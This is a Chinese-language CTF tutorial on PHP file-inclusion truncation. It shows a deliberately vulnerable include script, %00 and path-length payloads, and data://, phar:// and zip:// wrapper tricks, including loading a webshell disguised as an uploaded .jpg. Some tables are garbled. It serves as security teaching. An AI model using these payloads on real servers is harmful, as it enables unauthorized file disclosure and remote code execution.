# CTF中截断在文件包含中的应用



## 0x01 CTF中的文件包含

文件包含在CTF中算是一种比较常见的题型。如果单独作为一题的话基本上都是考你能否找到这个文件。还有一种就是混合型的和其他知识点一起考，通过文件包含找到源码然后再代码审计。

## 0x02 常规截断

要求：

- php版本小于5.3.4
- magic_quotes_gpc为off状态

漏洞文件index.php

```
<?php
if (empty($_GET["file"])){
    echo('../flag.php');
    return;
}
else{
    $filename='pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome.txt").'.html';
    include $filename;
}
?>

```

flag文件放在上层目录

这里限制了后缀名，我们需要通过截断才能访问到flag文件利用代码：

```
index.php?file=../../flag.php%00

```

![img](https://pic2.zhimg.com/80/v2-0f8bb8b0f13f0c41f911567e5c04a7e2_hd.jpg)

%00 会被解析为0x00，所以导致截断的发生我们通过截断成功的绕过了后缀限制

## 0x03 路径长度截断

我们现在已经知道使用%00截断有两个条件php版本小于5.3.4和magic_quotes_gpc为off状态。如果这时我们将magic_quotes_gpc改为on那么就不能截断了，因为开启magic_quotes_gpc后%00会被加上一个反斜杠转义掉

![img](https://pic4.zhimg.com/80/v2-4ae67b246f19f5fe0d2355c77021bfef_hd.jpg)

那么我们这时候有没有办法绕过这个限制呢？答案是肯定的，但依旧有一个条件那就是php版本小于5.3.10我们的代码依旧不变漏洞文件index.php

```
<?php
if (empty($_GET["file"])){
    echo('../flag.php');
    return;
}
else{
    $filename='pages/'.(isset($_GET["file"])?$_GET["file"]:"welcome.txt").'.html';
    include $filename;
}
?>

```

flag文件放在上层目录这时我们可以使用字符 .    /.   和  ./  来进行绕过，因为文件路径有长度限制

- windows 259个bytes
- linux 4096个bytes

在windows下需要.字符最少的利用POC1：

```
file=../../flag.php..............................................................................................................................................................................................................................................

```

![img](https://pic2.zhimg.com/80/v2-727b4d978c8ed0f1676673c26851761d_hd.jpg)

在windows下需要.字符最少的利用POC2：

```
file=../../flag.php./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

```

![img](https://pic1.zhimg.com/80/v2-9ca3a3374552ee9db6dc65c999b21a3a_hd.jpg)

将flag.php改为flag1.php在windows下需要.字符最少的利用POC3：

```
file=../../flag1.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././

```

![img](https://pic1.zhimg.com/80/v2-a9471dd64354a01407e18a5a1cccb2b9_hd.jpg)

我们发现在使用payload3时将文件名改为了flag1.php，而payload2和payload3则是一个.开始，一个/开始。这和文件长度的奇偶性有关，当为偶数的时候我们选择payload2，为奇数的时候我们选择payload3

## 0x04 总结

使用截断的时候根据题目的具体情况使用不同的截断方法，遇到奇偶问题的时候我们可以丢一串很长的./到URL后面然后再调整第一个字符即可。一般来说%00就足够了，当%00不行时再尝试./的组合

### 远程文件包含

当`allow_url_include=on`时，可以远程包含恶意攻击者主机上的恶意文件。或者使用PHP输入输出流进行利用

### 伪协议

##### data://text/plain

1. 解释

数据流封装器，和php://相似都是利用了流的概念， 将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入的payload来实现目的

1. 用法

| 12   | ?file=data://text/plain;base64,base64编码的payload |
| ---- | ---------------------------------------- |
|      |                                          |

1. 注意

`闭合

如果`php.ini`里的`allow_url_include=On(PHP < 5.30)`，就可以造成任意代码执行，同理在这就可以理解成远程文件包含（RFI）

#### phar://

1. 解释

数据流包装器，自PHP5.3.0起开始有效，正好契合上面两个伪协议的利用条件，说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关

1. 用法

| 123456 | ?file=phar://压缩包/内部文件 写一个shell.php文件，里面包含一句话木马。然后，压缩成xxx.zip。然后改名为xxx.jpg进行上传。最后使用phar进行包含，http://xxx.xxx.xxx.xxx/index.php?id=phar://路径/xxx.jpg/shell |
| ------ | ---------------------------------------- |
|        |                                          |

1. 注意

| 123456 | php版本需要大于5.3，这就说明上述协议已经挂掉了，但又出来了phar协议前仆后继压缩包一般是phar后缀，需要代码来生成，但是zip后缀也可以压缩包需要时zip协议压缩，rar不行，tar等格式待测利用url的压缩包后缀可以是任意后缀如果`php.ini`里的`allow_url_include=On(PHP > 5.30)`，就可以造成任意代码执行，同理在这就可以理解成远程文件包含（RFI） |
| ------ | ---------------------------------------- |
|        |                                          |

1. zip协议绕过

| 12   | zip://xxx.jpg%23shell |
| ---- | --------------------- |
|      |                       |